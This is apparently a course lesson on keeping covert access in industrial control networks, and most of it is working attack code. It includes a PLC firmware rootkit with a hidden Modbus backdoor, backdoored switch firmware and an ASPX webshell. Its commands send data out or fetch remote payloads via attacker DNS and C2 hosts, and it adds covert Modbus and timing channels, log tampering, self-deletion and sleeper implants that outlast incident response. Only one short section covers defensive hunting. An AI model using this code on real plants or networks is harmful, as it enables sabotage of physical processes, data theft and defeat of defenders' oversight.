Lesson 08: Advanced Persistence in
OT Networks

Lesson 08: Advanced Persistence in OT
Networks
Learning Objectives
●​
●​
●​
●​
●​
●​
●​
●​

Establish persistent access in air-gapped and semi-isolated OT networks
Implement multi-layered redundancy to survive incident response
Develop covert communication channels within legitimate ICS protocols
Bypass detection mechanisms specific to operational technology
Leverage firmware-based persistence in PLCs, RTUs, and network devices
Utilize "living off the land" binaries (LOLBins) specific to OT environments
Maintain long-term access across network segmentation and change management
Analyze persistence mechanisms in real-world ICS malware (Triton, Industroyer)

1. Persistence Challenges in OT Environments
1.1 Unique Characteristics of OT Networks
Why OT Persistence is Different:
┌────────────────────────────────────────────────────────
──┐
│ IT Networks
│ OT Networks
│
├───────────────────────┼────────────────────────────────
──┤
│ Internet-connected │ Air-gapped or semi-isolated
│
│ Frequent patching │ Patching rare (stability risk) │
│ EDR/AV standard
│ Limited/no EDR (compatibility) │
│ Log aggregation
│ Minimal logging
│
│ Rapid IR response │ Slow change management
│
│ VMs/Cloud (ephemeral) │ Physical/embedded (persistent) │
│ Short device lifetime │ 10-20 year operational lifespan │
└───────────────────────┴────────────────────────────────
──┘
Implications for Attackers:
●​
●​
●​
●​

Persistence is easier to achieve
Detection is less likely (blind spots)
Remediation is slow (maintenance windows)
Multi-year dwell time is common

Implications for Defenders:

●​
●​
●​
●​

Must assume compromise
Forensic artifacts decay slowly
Complete remediation is difficult
Prevention is critical (detection is harder)

1.2 Persistence Objectives in OT
1.​ Long-term reconnaissance: Monitor industrial processes for intelligence
2.​ Pre-positioned capability: Maintain dormant access for future activation
3.​ Sabotage on demand: Trigger process disruption at strategic time
4.​ Data exfiltration: Steal intellectual property (process recipes, engineering data)
5.​ Supply chain compromise: Use one victim to reach others (vendor access)

2. Firmware-Based Persistence
2.1 PLC Firmware Rootkit
Most resilient persistence method: embed in PLC operating system firmware.
# plc_firmware_rootkit.py - Inject persistent rootkit into PLC firmware
import struct
import hashlib
class PLCFirmwareRootkit:
def __init__(self, firmware_image):
self.firmware = bytearray(open(firmware_image, 'rb').read())
self.rootkit_code = self.compile_rootkit()
def find_injection_point(self):
"""
Locate suitable injection point in firmware
- Look for NOP sleds or padding
- Find unused code regions
- Hook initialization routines
"""
# Search for NOP sled (0x00 bytes)
for i in range(len(self.firmware) - 1024):
if self.firmware[i:i+1024] == bytes(1024):
print(f"[+] Found NOP sled at offset: 0x{i:x}")
return i
# Alternative: Extend firmware image (append rootkit)
return len(self.firmware)
def compile_rootkit(self):
"""
Rootkit features:

- Hook Modbus request handler
- Hidden function code (0xAB) triggers backdoor
- Exfiltrate ladder logic on special request
- Modify process variables on command
"""
# Assembly code for ARM Cortex-M (common in PLCs)
rootkit_asm = """
; Modbus request handler hook
PUSH {R4-R7, LR}
; Check if function code is 0xAB (magic backdoor trigger)
LDR R0, [R1]
; Load Modbus PDU
LDRB R2, [R0, #0] ; Get function code
CMP R2, #0xAB
BEQ backdoor_handler
; Normal processing
BL original_modbus_handler
POP {R4-R7, PC}
backdoor_handler:
; Execute hidden command
LDRB R3, [R0, #1] ; Get command byte
CMP R3, #0x01
; Command: Read ladder logic
BEQ dump_ladder_logic
CMP R3, #0x02
; Command: Modify output
BEQ modify_output
dump_ladder_logic:
; Copy PLC program to response buffer
; [Implementation details]
POP {R4-R7, PC}
modify_output:
; Force output state regardless of logic
; [Implementation details]
POP {R4-R7, PC}
"""
# Assemble to bytecode (simplified - actual implementation needs assembler)
rootkit_bytecode = self.assemble_arm(rootkit_asm)
return rootkit_bytecode
def inject_rootkit(self):
"""
Inject rootkit into firmware and fix control flow
"""
injection_offset = self.find_injection_point()

# Write rootkit code
self.firmware[injection_offset:injection_offset+len(self.rootkit_code)] = self.rootkit_code
# Hook Modbus handler (redirect to rootkit)
# Find CALL instruction to original handler
handler_call_offset = self.find_modbus_handler_call()
if handler_call_offset:
# Replace with CALL to rootkit
self.patch_call_instruction(handler_call_offset, injection_offset)
# Update firmware checksum
self.fix_checksum()
# Write infected firmware
with open('infected_firmware.bin', 'wb') as f:
f.write(self.firmware)
print("[+] Rootkit injected successfully")
print(f"[+] Inject offset: 0x{injection_offset:x}")
def fix_checksum(self):
"""
Recalculate firmware checksum so PLC accepts modified image
"""
# Checksum usually at end of firmware
checksum_offset = len(self.firmware) - 4
# Calculate CRC32 of firmware (excluding checksum field)
import zlib
crc = zlib.crc32(self.firmware[:checksum_offset])
# Write new checksum
self.firmware[checksum_offset:checksum_offset+4] = struct.pack('<I', crc)
# Usage
rootkit = PLCFirmwareRootkit("siemens_s7_1200_v4.2.bin")
rootkit.inject_rootkit()
Activation of Firmware Rootkit:
# activate_plc_rootkit.py - Send magic Modbus command
from pymodbus.client import ModbusTcpClient
def trigger_backdoor(plc_ip, command):
"""
Send hidden Modbus function code to activate rootkit
"""

client = ModbusTcpClient(plc_ip, port=502)
client.connect()
# Craft malicious Modbus request
# Function code 0xAB (not in official spec, hidden backdoor)
# Command byte: 0x01 = dump ladder logic, 0x02 = modify output
malicious_pdu = bytes([0xAB, command]) # Function code + command
# Send raw Modbus frame
# Bypasses library validation
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((plc_ip, 502))
# Modbus TCP header
transaction_id = 0x0001
protocol_id = 0x0000
length = len(malicious_pdu) + 1 # PDU + unit ID
unit_id = 0x01
mbap_header = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id)
full_frame = mbap_header + malicious_pdu
sock.send(full_frame)
response = sock.recv(1024)
# Parse backdoor response
if len(response) > 8:
print("[+] Backdoor activated!")
print(f"[+] Response: {response[8:].hex()}")
return response[8:]
sock.close()
# Dump ladder logic via firmware backdoor
ladder_logic = trigger_backdoor("192.168.1.10", 0x01)
with open("stolen_ladder_logic.bin", 'wb') as f:
f.write(ladder_logic)

2.2 Network Device Firmware Persistence
Industrial switches and routers are high-value persistence targets.
# industrial_switch_implant.py - Backdoor Hirschmann, Ruggedcom, or Cisco IE switches
class IndustrialSwitchBackdoor:
def __init__(self, switch_ip, credentials):
self.switch_ip = switch_ip

self.creds = credentials
def compromise_switch(self):
"""
Gain access to industrial switch
- Default credentials (common in OT)
- Exploit (CVE-2020-3566 for Cisco IE)
- Physical access (console port)
"""
import paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(self.switch_ip, username=self.creds[0], password=self.creds[1])
return ssh
def install_firmware_backdoor(self, ssh):
"""
Modify switch firmware to inject backdoor
"""
# Download current firmware
stdin, stdout, stderr = ssh.exec_command('show boot | include BOOT')
firmware_file = stdout.read().decode().split()[1]
# Copy firmware off switch
sftp = ssh.open_sftp()
sftp.get(firmware_file, 'switch_firmware.bin')
sftp.close()
# Inject backdoor (similar to PLC rootkit)
self.modify_firmware('switch_firmware.bin')
# Upload modified firmware
sftp = ssh.open_sftp()
sftp.put('switch_firmware_backdoored.bin', firmware_file + '.new')
sftp.close()
# Set new firmware as boot image
ssh.exec_command(f'boot system flash:{firmware_file}.new')
ssh.exec_command('write memory')
ssh.exec_command('reload')
print("[+] Backdoored firmware installed, switch rebooting...")
def configure_traffic_mirroring(self, ssh):
"""
Configure port mirroring to copy OT traffic to attacker-controlled host

Stealthy persistent reconnaissance
"""
mirror_config = """
monitor session 1 source interface Gi1/1 - 1/24
monitor session 1 destination interface Gi1/25
"""
ssh.exec_command('configure terminal')
for line in mirror_config.split('\n'):
ssh.exec_command(line)
ssh.exec_command('end')
ssh.exec_command('write memory')
print("[+] Traffic mirroring configured - all OT traffic copied to Gi1/25")
def inject_rogue_vlan(self, ssh):
"""
Create hidden VLAN for C2 communication
Blends with legitimate network segmentation
"""
rogue_vlan_config = """
vlan 666
name SYSTEM_MANAGEMENT
interface Vlan666
ip address 10.10.66.1 255.255.255.0
"""
ssh.exec_command('configure terminal')
for line in rogue_vlan_config.split('\n'):
ssh.exec_command(line)
ssh.exec_command('end')
ssh.exec_command('write memory')
# Usage - compromise industrial Ethernet switch
backdoor = IndustrialSwitchBackdoor("192.168.1.254", ("admin", "admin"))
ssh_session = backdoor.compromise_switch()
backdoor.install_firmware_backdoor(ssh_session)
backdoor.configure_traffic_mirroring(ssh_session)

3. Living Off the Land in OT Environments
3.1 Abusing ICS Engineering Tools
# ot_lolbins_persistence.ps1 - Abuse legitimate ICS tools for persistence
# TIA Portal auto-connect script
# Planted in Startup folder, automatically programs PLCs on EWS boot

$tia_script = @"
# TIA_Auto_Connect.ps1
Import-Module 'C:\Program Files\Siemens\Automation\Portal
V17\PublicAPI\V17\Siemens.Engineering.dll'
`$project = Open-TiaPortalProject -Path 'C:\Projects\Legitimate_Project.ap17'
# Hidden malicious action: Upload backdoored program to all PLCs
foreach (`$device in `$project.Devices) {
if (`$device.Type -like '*S7-1200*') {
# Upload infected OB1
Upload-PLCProgram -Device `$device -Program 'C:\Temp\backdoored_ob1.bin'
}
}
"@
$tia_script | Out-File "$env:APPDATA\Microsoft\Windows\Start
Menu\Programs\Startup\TIA_Auto_Connect.ps1"
# SCADA Historian data collection script (modified for exfiltration)
$historian_script = @"
# Legitimate: Collect process data every hour
# Malicious: Also exfiltrate to external server
`$data = Get-SCADAData -Tags 'Tank_Level', 'Pressure', 'Temperature'
# Legitimate logging
`$data | Export-Csv 'C:\Historian\data_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv'
# Covert exfiltration (looks like NTP traffic)
`$exfil_server = '203.0.113.50' # Attacker C2
`$encoded_data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(`$data |
ConvertTo-Json))
# Send via DNS TXT query (bypasses firewall)
Resolve-DnsName -Name "`$encoded_data.exfil.attacker.com" -Type TXT
"@
# Create scheduled task (runs as SYSTEM)
schtasks /create /tn "Historian_DataCollection" /tr "powershell.exe -File
C:\Scripts\historian_collect.ps1" /sc hourly /ru SYSTEM

3.2 WMI Event Subscription (Fileless Persistence)
# wmi_persistence_ot.ps1 - Fileless persistence on SCADA server
# Survives disk forensics (lives in WMI repository)
$FilterName = 'SCE_SystemMonitor'

$ConsumerName = 'SCE_UpdateHandler'
# Event filter: Trigger every 6 hours
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 21600 WHERE
TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments
@{
Name = $FilterName
EventNameSpace = 'root\cimv2'
QueryLanguage = 'WQL'
Query = $Query
}
# Command to execute (encoded PowerShell payload)
$Payload = @"
`$plc_ips = @('192.168.10.10', '192.168.10.11', '192.168.10.12')
foreach (`$plc in `$plc_ips) {
# Persistent PLC monitoring
`$status = Test-NetConnection -ComputerName `$plc -Port 502
if (`$status.TcpTestSucceeded) {
# Exfiltrate PLC status to C2
Invoke-WebRequest -Uri 'http://c2server.com/beacon' -Method POST -Body `$plc
}
}
"@
$EncodedPayload =
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))
$Consumer = Set-WmiInstance -Namespace root\subscription -Class
CommandLineEventConsumer -Arguments @{
Name = $ConsumerName
CommandLineTemplate = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc
$EncodedPayload"
}
# Bind filter to consumer
$Binding = Set-WmiInstance -Namespace root\subscription -Class
__FilterToConsumerBinding -Arguments @{
Filter = $Filter
Consumer = $Consumer
}
Write-Host "[+] WMI persistence established"
Write-Host "[+] Trigger: Every 6 hours"
Write-Host "[+] Action: PLC status monitoring + C2 beacon"

4. Covert Communication Channels
4.1 Protocol Tunneling in Industrial Protocols
# modbus_covert_channel.py - Hide C2 communications in Modbus traffic
from pymodbus.client import ModbusTcpClient
import struct
class ModbusCovertChannel:
def __init__(self, plc_ip, covert_register_start=1000):
self.client = ModbusTcpClient(plc_ip, port=502)
self.client.connect()
self.covert_registers = covert_register_start # High register numbers (unused)
def send_command(self, cmd_string):
"""
Encode command in Modbus register writes
Appears as normal PLC programming activity
"""
# Encode ASCII command in 16-bit registers
# Each register holds 2 characters
registers = []
for i in range(0, len(cmd_string), 2):
chunk = cmd_string[i:i+2].ljust(2, '\x00')
register_value = struct.unpack('>H', chunk.encode())[0]
registers.append(register_value)
# Write to covert registers
self.client.write_registers(self.covert_registers, registers)
print(f"[+] Command sent via Modbus: {cmd_string}")
def receive_response(self):
"""
Read response from covert registers
"""
# PLC rootkit writes response to registers
response_registers = self.client.read_holding_registers(self.covert_registers + 100, 50)
if response_registers.isError():
return None
# Decode registers to ASCII
response = ""
for register in response_registers.registers:
bytes_val = struct.pack('>H', register)
response += bytes_val.decode('ascii', errors='ignore')

return response.rstrip('\x00')
# Example: Exfiltrate data via Modbus
channel = ModbusCovertChannel("192.168.1.10")
channel.send_command("dump_ladder_logic")
time.sleep(2)
data = channel.receive_response()
print(f"[+] Exfiltrated: {data}")

4.2 Process Variable Steganography
# process_variable_steganography.py - Encode data in sensor readings
import random
class ProcessVariableSteganography:
def __init__(self, plc_controller):
self.plc = plc_controller
def encode_data_in_noise(self, secret_data, process_variable):
"""
Encode data in least significant bits of analog process values
Example: Tank level sensor with ±0.1% noise
Use noise band to transmit data
"""
# Read current process value (e.g., tank level = 75.3%)
current_value = self.plc.read_analog(process_variable)
# Convert secret data to binary
secret_binary = ''.join(format(ord(c), '08b') for c in secret_data)
# Encode in LSBs (modify value within noise tolerance)
for bit in secret_binary:
# Add or subtract small value based on bit
if bit == '1':
current_value += 0.05 # +0.05% (within ±0.1% noise)
else:
current_value -= 0.05 # -0.05%
# Write modified value to PLC
self.plc.write_analog(process_variable, current_value)
# Wait for historian to collect sample
time.sleep(1) # 1 Hz sampling rate
print(f"[+] Encoded {len(secret_data)} bytes in process variable {process_variable}")
def decode_data_from_historian(self, historian_samples):
"""

Extract hidden data from historian time-series
Analyst sees "normal" process fluctuations
"""
secret_binary = ""
for i in range(1, len(historian_samples)):
delta = historian_samples[i] - historian_samples[i-1]
if delta > 0.03: # Positive change -> bit '1'
secret_binary += '1'
elif delta < -0.03: # Negative change -> bit '0'
secret_binary += '0'
# Convert binary to ASCII
secret_data = ""
for i in range(0, len(secret_binary), 8):
byte = secret_binary[i:i+8]
if len(byte) == 8:
secret_data += chr(int(byte, 2))
return secret_data
# Usage: Exfiltrate configuration file via tank level sensor
stego = ProcessVariableSteganography(plc_connection)
secret = open('network_config.txt', 'r').read()
stego.encode_data_in_noise(secret, process_variable='Tank_01_Level')

4.3 Time-Based Covert Channel
# timing_covert_channel.py - Encode data in operation timing
import time
class TimingCovertChannel:
def __init__(self, plc_ip):
self.plc_ip = plc_ip
self.base_delay = 1.0 # Base interval (seconds)
def send_data(self, data):
"""
Encode data in timing intervals between Modbus requests
- Short delay (0.8s) = bit '0'
- Long delay (1.2s) = bit '1'
"""
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient(self.plc_ip)
client.connect()
# Convert data to binary

binary_data = ''.join(format(ord(c), '08b') for c in data)
for bit in binary_data:
# Send benign Modbus read request
client.read_holding_registers(0, 10)
# Encode bit in delay before next request
if bit == '0':
time.sleep(self.base_delay - 0.2) # 0.8s
else:
time.sleep(self.base_delay + 0.2) # 1.2s
client.close()
print(f"[+] Transmitted {len(data)} bytes via timing channel")
print(f"[+] Transfer time: {len(binary_data) * self.base_delay:.1f} seconds")
def receive_data(self, pcap_file):
"""
Decode data from packet capture (passive analysis)
Analyst sees "normal" Modbus polling
"""
from scapy.all import rdpcap, TCP
packets = rdpcap(pcap_file)
timestamps = []
# Extract Modbus request timestamps
for pkt in packets:
if pkt.haslayer(TCP) and pkt[TCP].dport == 502:
timestamps.append(float(pkt.time))
# Decode timing deltas
binary_data = ""
for i in range(1, len(timestamps)):
delta = timestamps[i] - timestamps[i-1]
if 0.7 < delta < 0.9: # Short delay -> '0'
binary_data += '0'
elif 1.1 < delta < 1.3: # Long delay -> '1'
binary_data += '1'
# Binary to ASCII
decoded = ""
for i in range(0, len(binary_data), 8):
byte = binary_data[i:i+8]
if len(byte) == 8:
decoded += chr(int(byte, 2))

return decoded
# Example: Exfiltrate credentials via timing channel
timing_channel = TimingCovertChannel("192.168.1.10")
timing_channel.send_data("admin:P@ssw0rd123")
# Extremely slow (~1 byte per second) but undetectable by DPI

5. Multi-Layered Persistence Strategy
5.1 Redundant Footholds Across Network Tiers
# multi_layer_persistence.py - Establish redundant access points
class MultiLayerPersistence:
def __init__(self, network_map):
self.network = network_map
def deploy_all_persistence_mechanisms(self):
"""
Plant persistence at every network level (Purdue Model)
Defender must remediate ALL to fully eradicate
"""
persistence_layers = []
# Layer 1: PLC firmware rootkit
for plc in self.network['plcs']:
self.install_plc_firmware_rootkit(plc)
persistence_layers.append(f"PLC {plc['ip']} firmware")
# Layer 2: HMI webshell
for hmi in self.network['hmis']:
self.deploy_webshell(hmi)
persistence_layers.append(f"HMI {hmi['ip']} webshell")
# Layer 3: SCADA server scheduled task
for scada in self.network['scada_servers']:
self.create_scheduled_task(scada)
persistence_layers.append(f"SCADA {scada['ip']} scheduled task")
# Layer 4: Engineering workstation DLL hijack
for ews in self.network['engineering_ws']:
self.deploy_dll_hijack(ews)
persistence_layers.append(f"EWS {ews['ip']} DLL hijack")
# Layer 5: Network switch firmware backdoor
for switch in self.network['switches']:
self.backdoor_switch_firmware(switch)
persistence_layers.append(f"Switch {switch['ip']} firmware")

# Layer 6: Database backdoor account
for db in self.network['databases']:
self.create_backdoor_account(db)
persistence_layers.append(f"Database {db['ip']} account")
print(f"[+] Deployed {len(persistence_layers)} persistence mechanisms")
for layer in persistence_layers:
print(f" - {layer}")
return persistence_layers
def install_plc_firmware_rootkit(self, plc):
"""Deploy firmware rootkit (most persistent)"""
# See section 2.1
pass
def deploy_webshell(self, hmi):
"""
Plant webshell in HMI web server
Often running Apache/IIS with web-based HMI interface
"""
webshell = """
<%@ Page Language="C#" %>
<%
string cmd = Request["cmd"];
if (!string.IsNullOrEmpty(cmd)) {
System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd).WaitForExit();
}
%>
"""
# Upload to HMI web root
# Example: C:\inetpub\wwwroot\HMI\system.aspx
def create_scheduled_task(self, scada):
"""
Create scheduled task on SCADA server
Runs daily at maintenance window (2 AM)
"""
import subprocess
task_cmd = f'schtasks /create /s {scada["ip"]} /u {scada["user"]} /p {scada["pass"]} /tn
"SCADA_Maintenance" /tr "powershell.exe -c IEX(New-Object
Net.WebClient).DownloadString(\'http://c2.com/payload.ps1\')" /sc daily /st 02:00 /ru
SYSTEM'
subprocess.call(task_cmd)
# Usage
network_topology = {

'plcs': [{'ip': '192.168.10.10'}, {'ip': '192.168.10.11'}],
'hmis': [{'ip': '192.168.20.10'}],
'scada_servers': [{'ip': '192.168.20.20', 'user': 'admin', 'pass': 'admin'}],
'engineering_ws': [{'ip': '192.168.30.10'}],
'switches': [{'ip': '192.168.1.254'}],
'databases': [{'ip': '192.168.20.30'}]
}
persistence = MultiLayerPersistence(network_topology)
persistence.deploy_all_persistence_mechanisms()

5.2 Mutual Reinfection (Worm-like Behavior)
# mutual_reinfection.py - Implants reinstall each other if one is removed
class MutualReinfection:
def __init__(self):
self.implants = {
'scada_server': {
'check_interval': 3600, # Check hourly
'reinstall_targets': ['ews', 'hmi']
},
'ews': {
'check_interval': 3600,
'reinstall_targets': ['scada_server', 'plc']
},
'hmi': {
'check_interval': 3600,
'reinstall_targets': ['scada_server']
},
'plc': {
'check_interval': 86400, # Check daily (less frequent, avoid detection)
'reinstall_targets': ['ews']
}
}
def heartbeat_check(self, implant_name):
"""
Periodically check if other implants are alive
If not, reinstall them
"""
import time
while True:
config = self.implants[implant_name]
for target in config['reinstall_targets']:
if not self.check_implant_alive(target):
print(f"[!] {target} implant missing, reinstalling...")

self.reinstall_implant(implant_name, target)
time.sleep(config['check_interval'])
def check_implant_alive(self, target):
"""
Check if target implant is running
- Try to connect to covert channel
- Check for beacon file
- Test hidden functionality
"""
if target == 'plc':
# Try to trigger PLC firmware backdoor
try:
response = trigger_backdoor(target_ip, 0x01)
return len(response) > 0
except:
return False
elif target == 'scada_server':
# Check for scheduled task
output = subprocess.check_output(f'schtasks /query /s {target_ip}')
return b'SCADA_Maintenance' in output
# ... other implant checks
def reinstall_implant(self, source, target):
"""
Reinstall missing implant from another compromised system
"""
if source == 'ews' and target == 'scada_server':
# EWS has saved credentials for SCADA server
# Can remotely create scheduled task
self.create_scheduled_task(scada_ip, scada_creds)
elif source == 'scada_server' and target == 'plc':
# SCADA server can program PLCs
# Reupload backdoored ladder logic
self.upload_malicious_plc_program(plc_ip)
# ... other reinstallation paths
# Each implant runs this in background
reinfection = MutualReinfection()
reinfection.heartbeat_check('scada_server') # Run on SCADA server

6. Evading Detection and Incident Response

6.1 Anti-Forensics Techniques
# anti_forensics_ot.py - Evade forensic analysis
class OTAntiForensics:
def __init__(self):
pass
def timestomp_plc_logs(self, plc_ip):
"""
Modify PLC diagnostic buffer timestamps
Hide when malicious program was uploaded
"""
from snap7 import client
plc = client.Client()
plc.connect(plc_ip, 0, 1)
# Read diagnostic buffer
diag_buffer = plc.read_area(snap7.types.S7AreaDB, 1, 0, 1024)
# Modify timestamps in buffer
# Make malicious upload appear to have occurred months ago
# (During normal maintenance window)
# Write modified buffer back
plc.write_area(snap7.types.S7AreaDB, 1, 0, diag_buffer)
def clear_scada_audit_logs(self, scada_server):
"""
Selectively clear incriminating log entries
Leave benign entries to avoid suspicion
"""
import win32evtlog
# Open Security event log
hand = win32evtlog.OpenEventLog(scada_server, "Security")
# Clear events related to:
# - Unauthorized logons (Event ID 4625)
# - Account creation (Event ID 4720)
# - Scheduled task creation (Event ID 4698)
# Technique: Read log, filter out incriminating events, write back
def anti_memory_forensics(self):
"""
Prevent memory dump analysis
- Encrypt strings in memory
- Detect debuggers and crash gracefully

- Use process hollowing (appear as legitimate process)
"""
# Check for common forensic tools
forensic_processes = [
'procmon.exe', 'procexp.exe', 'wireshark.exe',
'tcpdump', 'volatility', 'rekall'
]
for proc in psutil.process_iter(['name']):
if proc.info['name'].lower() in forensic_processes:
print("[!] Forensic tool detected, self-destructing...")
self.secure_self_delete()
sys.exit(0)
def secure_self_delete(self):
"""
Securely delete malware binary
Overwrite with random data before deletion
"""
import os
malware_path = sys.argv[0]
# Overwrite file with random data (7 passes, DoD 5220.22-M standard)
for i in range(7):
with open(malware_path, 'wb') as f:
f.write(os.urandom(os.path.getsize(malware_path)))
# Delete file
os.remove(malware_path)

6.2 Surviving Incident Response
IR Playbook for OT Compromise:
1.​ Isolate affected systems
2.​ Collect forensic images
3.​ Analyze logs
4.​ Identify malware
5.​ Remove malware
6.​ Restore from backup
7.​ Resume operations
Attacker Counter-Strategies:
# survive_incident_response.py - Maintain access during IR
class SurviveIncidentResponse:
def detect_ir_activity(self):
"""

Monitor for signs of incident response
- New accounts created (forensic analysts)
- Network scanning from new IPs
- Increased log activity
- Systems being taken offline
"""
indicators = {
'new_accounts': self.check_new_user_accounts(),
'network_scans': self.detect_network_scanning(),
'backup_activity': self.detect_backup_operations(),
'offline_systems': self.monitor_system_availability()
}
if any(indicators.values()):
print("[!] Incident response detected!")
self.activate_evasion_mode()
def activate_evasion_mode(self):
"""
Change tactics during active IR
"""
# Go dormant (stop beaconing)
self.disable_c2_communication()
# Hide in legitimate processes
self.migrate_to_system_process()
# Establish backup C2 channel
self.activate_backup_c2()
# Deploy "time bomb" for reactivation
self.set_reactivation_trigger(trigger_date='2024-06-01')
def deploy_sleeper_implant(self):
"""
Plant dormant implant that activates months later
After IR team declares "all clear"
"""
sleeper_code = """
# Activates 180 days after IR
import time, datetime
activation_date = datetime.datetime(2024, 6, 1)
while datetime.datetime.now() < activation_date:
time.sleep(86400) # Sleep 24 hours
# IR team has moved on, reactivate persistence
restore_all_persistence()

resume_c2_communication()
"""
# Encode and hide in WMI or registry
self.hide_sleeper_code(sleeper_code)

7. Real-World Case Studies
7.1 Triton/Trisis Persistence Analysis
Persistent Triconex SIS Compromise:
# triton_persistence_reconstruction.py - How Triton maintained access
"""
Triton malware (2017 Saudi Aramco attack) persistence mechanisms:
1. Modified Triconex firmware (TriStation protocol)
2. Injected malicious logic into safety function
3. Disabled safety instrumented functions
4. Remained undetected for months
Persistence features:
- Firmware-level implant (survives reboot)
- Triggered only on specific conditions
- Minimal network activity (local PLC operations)
"""
class TritonPersistence:
def inject_into_sis_firmware(self, triconex_controller):
"""
Modify Schneider Triconex SIS firmware
Insert backdoor into safety logic
"""
# Triton used TriStation protocol (proprietary)
# Function code 0x05: Write program to controller
malicious_ladder_logic = """
; Hidden safety bypass
; If specific memory flag is set, disable shutdown
LD bypass_flag
ANDN critical_condition
OUT safety_shutdown
"""
# Upload to Triconex controller
self.tristation_upload(triconex_controller, malicious_ladder_logic)

def establish_dormancy(self):
"""
Remain dormant until activation trigger
Triton waited for specific industrial process state
"""
while True:
process_state = self.read_process_variables()
if process_state['pressure'] > THRESHOLD:
# Activate payload
self.disable_safety_systems()
break
time.sleep(600) # Check every 10 minutes

7.2 Industroyer Persistence Mechanisms
# industroyer_persistence.py - Multi-protocol persistence
"""
Industroyer (2016 Ukraine blackout) persistence:
1. Windows backdoor (44con module)
2. IEC 104 protocol implant
3. IEC 61850 GOOSE manipulator
4. OPC DA data wiper
Persistence across protocols ensures redundancy
"""
class IndustroyerPersistence:
def deploy_multiprotocol_backdoors(self):
"""
Install backdoors for each industrial protocol in use
"""
# IEC 104 backdoor (substation automation)
self.install_iec104_backdoor()
# IEC 61850 backdoor (GOOSE messages)
self.install_iec61850_backdoor()
# OPC DA backdoor (SCADA data access)
self.install_opcda_backdoor()
# Modbus backdoor (RTU/field devices)
self.install_modbus_backdoor()
def time_based_activation(self, target_datetime):
"""

Activate attack at specific time (coordinated blackout)
"""
while datetime.datetime.now() < target_datetime:
# Remain dormant
time.sleep(3600)
# Simultaneous multi-protocol attack
self.open_all_breakers_iec104()
self.spoof_goose_protection()
self.wipe_opc_configuration()

8. Defensive Detection Strategies
8.1 Persistence Hunting in OT
# ot_persistence_hunter.py - Detect persistence mechanisms
class OTPersistenceHunter:
def __init__(self):
self.findings = []
def scan_plc_firmware_integrity(self, plc_ip):
"""
Verify PLC firmware hasn't been modified
"""
from snap7 import client
plc = client.Client()
plc.connect(plc_ip, 0, 1)
# Calculate firmware hash
firmware = plc.full_upload(snap7.types.S7AreaFirmware, 0)
current_hash = hashlib.sha256(firmware).hexdigest()
# Compare to known-good hash (from vendor)
known_good_hash = "a1b2c3..." # From Siemens database
if current_hash != known_good_hash:
self.findings.append(f"ALERT: PLC {plc_ip} firmware modified!")
return False
return True
def check_scheduled_tasks(self, scada_server):
"""
Enumerate scheduled tasks on SCADA servers
Look for suspicious tasks
"""
import subprocess

output = subprocess.check_output(f'schtasks /query /s {scada_server} /fo csv')
suspicious_indicators = [
'powershell.exe -enc', # Encoded PS commands
'SYSTEM', # Running as SYSTEM (unusual for SCADA tasks)
'02:00', # Maintenance window (common persistence time)
]
for line in output.decode().split('\n'):
if any(indicator in line for indicator in suspicious_indicators):
self.findings.append(f"Suspicious task: {line}")
def detect_covert_channels(self, pcap_file):
"""
Analyze Modbus traffic for covert channels
Look for abnormal register access patterns
"""
from scapy.all import rdpcap
packets = rdpcap(pcap_file)
# Baseline: Normal Modbus register access (registers 0-500)
# Suspicious: Access to high register numbers (1000+)
suspicious_registers = []
for pkt in packets:
if self.is_modbus_packet(pkt):
register = self.extract_register_address(pkt)
if register > 500:
suspicious_registers.append(register)
if suspicious_registers:
self.findings.append(f"Covert channel detected: Registers {suspicious_registers}")
# Usage
hunter = OTPersistenceHunter()
hunter.scan_plc_firmware_integrity("192.168.1.10")
hunter.check_scheduled_tasks("scada-server-01")
hunter.detect_covert_channels("modbus_traffic.pcap")

9. Hands-On Lab Exercises
Lab 1: PLC Firmware Rootkit
Objective: Inject persistence into PLC firmware
Steps:

1.​ Extract firmware from Siemens S7-1200 (or OpenPLC)
2.​ Reverse engineer firmware structure with binwalk
3.​ Craft rootkit payload (hidden Modbus function code)
4.​ Inject rootkit into firmware
5.​ Reflash PLC with modified firmware
6.​ Test rootkit activation via magic Modbus command
7.​ Verify persistence across reboot

Lab 2: Multi-Layered Persistence
Objective: Deploy redundant persistence mechanisms
Deployment:
●​
●​
●​
●​

SCADA server: Scheduled task + WMI event subscription
Engineering workstation: DLL hijack in TIA Portal
HMI: Webshell in IIS web root
PLC: Modified ladder logic with hidden rung

Testing:
●​ Simulate IR: Remove one persistence mechanism
●​ Verify other mechanisms auto-reinstall it
●​ Measure time to full eradication

Lab 3: Covert Channel Communication
Objective: Implement Modbus covert channel
Tasks:
1.​ Set up Modbus master/slave (or PLC)
2.​ Implement covert channel protocol (register encoding)
3.​ Exfiltrate file via Modbus (slow, undetectable)
4.​ Capture traffic with Wireshark
5.​ Demonstrate traffic appears normal to analysts
6.​ Measure bandwidth and detection risk

Lab 4: Anti-Forensics
Objective: Evade forensic analysis
Techniques:
●​
●​
●​
●​
●​

Timestomp PLC diagnostic logs
Clear Windows event logs (selective deletion)
Encrypt strings in memory
Detect Process Monitor and self-destruct
Secure file deletion (DoD 5220.22-M)

Lab 5: Incident Response Evasion
Objective: Survive simulated IR
Scenario:
●​ Blue team conducts IR on compromised OT network
●​ Red team (you) must maintain access during remediation
Evasion Tactics:
●​
●​
●​
●​

Go dormant when new forensic accounts detected
Migrate to whitelisted process (Siemens service)
Deploy sleeper implant (reactivates in 30 days)
Use backup C2 channel (DNS tunneling)

10. Tools & Resources
Persistence Tools
●​
●​
●​
●​

SharPersist: Windows persistence toolkit
Empire: PowerShell post-exploitation framework
Covenant: .NET C2 with persistence modules
Sliver: Modern C2 platform

Firmware Analysis
●​
●​
●​
●​

binwalk: Firmware extraction
Ghidra: Reverse engineering
IDA Pro: Disassembler
